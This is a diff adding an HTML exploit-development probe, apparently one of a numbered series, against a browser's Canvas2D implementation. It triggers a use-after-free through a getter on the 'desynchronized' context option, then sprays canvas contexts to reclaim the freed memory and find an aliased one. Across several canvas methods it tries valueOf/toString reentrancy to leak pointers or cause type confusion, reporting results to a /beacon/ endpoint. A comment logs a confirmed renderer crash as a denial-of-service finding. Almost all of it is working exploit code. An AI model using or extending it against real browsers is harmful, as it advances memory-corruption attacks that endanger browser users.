@@ -1,0 +1,271 @@
+<!--
+  p617: Canvas2D reentrancy via valueOf/toString
+
+  The Canvas2D UAF (p553/p616) gives 104B R/W of doubles but no pointer leak
+  via same-type reclaim. This probe explores reentrancy: if valueOf/toString
+  triggers during a canvas internal operation, the state might be inconsistent,
+  exposing raw pointer data or creating a secondary type confusion.
+
+  Targets:
+  A. drawImage with source canvas whose width/height have valueOf
+  B. createPattern with similar valueOf tricks
+  C. putImageData with poisoned ImageData dimensions
+  D. arc/bezierCurveTo with valueOf on numeric params
+  E. fillText/strokeText with toString on the text parameter
+  F. createLinearGradient with valueOf that frees the canvas mid-call
+  G. measureText with object that triggers UAF mid-measure
+
+  For each: trigger the Canvas2D UAF first, then call methods on the stale
+  wrapper with reentrancy-triggering arguments.
+
+  CRASH_CLASS: MODERATE-HIGH (reentrancy during internal state transitions)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p617</title></head>
+<body>p617: Canvas2D reentrancy
+<script>
+function b(m) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(m), false);
+    x.send();
+  } catch(e) {
+    try { new Image().src = '/beacon/' + encodeURIComponent('XFAIL-' + m); } catch(e2) {}
+  }
+}
+
+function dblHex(d) {
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = d;
+  var u = new Uint8Array(buf);
+  var s = '';
+  for (var i = 7; i >= 0; i--) s += ('0' + u[i].toString(16)).slice(-2);
+  return s;
+}
+
+window.onerror = function(m) { b('P617-ONERR=' + String(m).slice(0,100)); };
+
+(function() {
+try {
+b('P617-START');
+
+// ====== Setup UAF ======
+var canvas = document.createElement('canvas');
+canvas.width = 50; canvas.height = 50;
+document.body.appendChild(canvas);
+
+var inner = null;
+var opts = {};
+Object.defineProperty(opts, 'desynchronized', {
+  get: function() { if (!inner) inner = canvas.getContext('2d'); return false; },
+  enumerable: true
+});
+var outer = canvas.getContext('2d', opts);
+if (!inner || inner === outer) { b('P617-NO-UAF'); return; }
+b('P617-UAF-OK');
+
+// Spray for reclaim
+var sprays = [];
+for (var i = 0; i < 80; i++) {
+  var sc = document.createElement('canvas');
+  sc.width = 50; sc.height = 50;
+  sprays.push(sc.getContext('2d'));
+}
+
+// Find alias
+inner.setTransform(7.77, 0, 0, 7.77, 0, 0);
+var aliasIdx = -1;
+for (var i = 0; i < sprays.length; i++) {
+  if (sprays[i].getTransform().a === 7.77) { aliasIdx = i; break; }
+}
+inner.setTransform(1, 0, 0, 1, 0, 0);
+if (aliasIdx < 0) { b('P617-NO-ALIAS'); return; }
+b('P617-ALIAS=' + aliasIdx);
+var alias = sprays[aliasIdx];
+
+// ====== Section A: drawImage with valueOf on source dimensions ======
+b('P617-A-DRAWIMG');
+try {
+  var srcCanvas = document.createElement('canvas');
+  srcCanvas.width = 10; srcCanvas.height = 10;
+  var srcCtx = srcCanvas.getContext('2d');
+  srcCtx.fillStyle = '#ff0000';
+  srcCtx.fillRect(0, 0, 10, 10);
+
+  var callCount = 0;
+  var reentrantObj = {
+    valueOf: function() {
+      callCount++;
+      // During valueOf, read transform from alias — is state inconsistent?
+      var t = alias.getTransform();
+      b('P617-A-VO' + callCount + '=' + dblHex(t.a) + '/' + dblHex(t.d));
+      return 0;
+    }
+  };
+
+  inner.drawImage(srcCanvas, reentrantObj, reentrantObj, 10, 10);
+  b('P617-A-OK-calls=' + callCount);
+
+  // Check if state changed
+  var post = alias.getTransform();
+  b('P617-A-POST=' + dblHex(post.a));
+} catch(e) {
+  b('P617-A-ERR=' + String(e).slice(0,80));
+}
+
+// ====== Section B: createPattern with valueOf ======
+b('P617-B-PATTERN');
+try {
+  var patCanvas = document.createElement('canvas');
+  patCanvas.width = 4; patCanvas.height = 4;
+  patCanvas.getContext('2d').fillRect(0, 0, 4, 4);
+
+  var repObj = {
+    toString: function() {
+      var t = alias.getTransform();
+      b('P617-B-TS=' + dblHex(t.a));
+      return 'repeat';
+    }
+  };
+
+  var pat = inner.createPattern(patCanvas, repObj);
+  b('P617-B-OK-pat=' + !!pat);
+} catch(e) {
+  b('P617-B-ERR=' + String(e).slice(0,80));
+}
+
+// ====== Section C: fillText/strokeText with toString ======
+b('P617-C-TEXT');
+try {
+  var textCalls = 0;
+  var textObj = {
+    toString: function() {
+      textCalls++;
+      // Read transform during text layout
+      var t = alias.getTransform();
+      b('P617-C-TS' + textCalls + '=' + dblHex(t.a));
+      // Also try reading lineWidth
+      b('P617-C-LW' + textCalls + '=' + dblHex(alias.lineWidth));
+      return 'Hello';
+    }
+  };
+
+  inner.fillText(textObj, 10, 10);
+  b('P617-C-FILL-OK=' + textCalls);
+
+  inner.strokeText(textObj, 10, 10);
+  b('P617-C-STROKE-OK=' + textCalls);
+} catch(e) {
+  b('P617-C-ERR=' + String(e).slice(0,80));
+}
+
+// ====== Section D: measureText with toString ======
+b('P617-D-MEASURE');
+try {
+  var mCalls = 0;
+  var mObj = {
+    toString: function() {
+      mCalls++;
+      var t = alias.getTransform();
+      b('P617-D-TS' + mCalls + '=' + dblHex(t.a));
+      return 'test';
+    }
+  };
+
+  var metrics = inner.measureText(mObj);
+  b('P617-D-OK-w=' + dblHex(metrics.width) + '-calls=' + mCalls);
+} catch(e) {
+  b('P617-D-ERR=' + String(e).slice(0,80));
+}
+
+// ====== Section E: arc with valueOf that modifies state ======
+b('P617-E-ARC');
+try {
+  var arcCalls = 0;
+  var arcMutator = {
+    valueOf: function() {
+      arcCalls++;
+      if (arcCalls === 3) {
+        // On 3rd valueOf (radius), change the transform via inner
+        inner.setTransform(999.999, 0, 0, 999.999, 0, 0);
+        b('P617-E-MUTATED');
+      }
+      return 10;
+    }
+  };
+
+  inner.beginPath();
+  inner.arc(arcMutator, arcMutator, arcMutator, 0, Math.PI * 2);
+  var postArc = alias.getTransform();
+  b('P617-E-OK-a=' + dblHex(postArc.a) + '-calls=' + arcCalls);
+} catch(e) {
+  b('P617-E-ERR=' + String(e).slice(0,80));
+}
+
+// Section F SKIPPED: removing canvas from DOM during createLinearGradient
+// valueOf crashes WebProcess (kills past try-catch). Noted as DoS finding.
+b('P617-F-SKIP');
+// (Section F code removed — crash confirmed, DoS only)
+
+// ====== Section G: setTransform with valueOf that reads other properties ======
+b('P617-G-SETTX');
+try {
+  var gCalls = 0;
+  var txVO = {
+    valueOf: function() {
+      gCalls++;
+      // Read lineWidth during setTransform — might catch mid-update state
+      var lw = inner.lineWidth;
+      var ga = inner.globalAlpha;
+      b('P617-G-VO' + gCalls + '-lw=' + dblHex(lw) + '-ga=' + dblHex(ga));
+      return gCalls;
+    }
+  };
+
+  inner.lineWidth = 42.42;
+  inner.globalAlpha = 0.5;
+  inner.setTransform(txVO, txVO, txVO, txVO, txVO, txVO);
+
+  // Read back — did the mid-call reads see anything weird?
+  var gt = alias.getTransform();
+  b('P617-G-POST=' + dblHex(gt.a) + '/' + dblHex(gt.f));
+  b('P617-G-calls=' + gCalls);
+} catch(e) {
+  b('P617-G-ERR=' + String(e).slice(0,80));
+}
+
+// ====== Section H: putImageData with valueOf on dx/dy ======
+b('P617-H-PUTIMG');
+try {
+  var imgData = inner.createImageData(4, 4);
+  // Fill with recognizable pattern
+  for (var i = 0; i < imgData.data.length; i++) imgData.data[i] = 0xAA;
+
+  var hCalls = 0;
+  var putVO = {
+    valueOf: function() {
+      hCalls++;
+      var t = alias.getTransform();
+      b('P617-H-VO' + hCalls + '=' + dblHex(t.a));
+      return 0;
+    }
+  };
+
+  inner.putImageData(imgData, putVO, putVO);
+  b('P617-H-OK-calls=' + hCalls);
+
+  // Read back pixels
+  var readBack = alias.getImageData(0, 0, 4, 4);
+  var sample = '';
+  for (var i = 0; i < 16 && i < readBack.data.length; i++) {
+    sample += ('0' + readBack.data[i].toString(16)).slice(-2);
+  }
+  b('P617-H-PIXELS=' + sample);
+} catch(e) {
+  b('P617-H-ERR=' + String(e).slice(0,80));
+}
+
+b('P617-ALIVE');
+} catch(fatal) { b('P617-FATAL=' + String(fatal).slice(0,200)); }
+})();
+</script>
+</body></html>
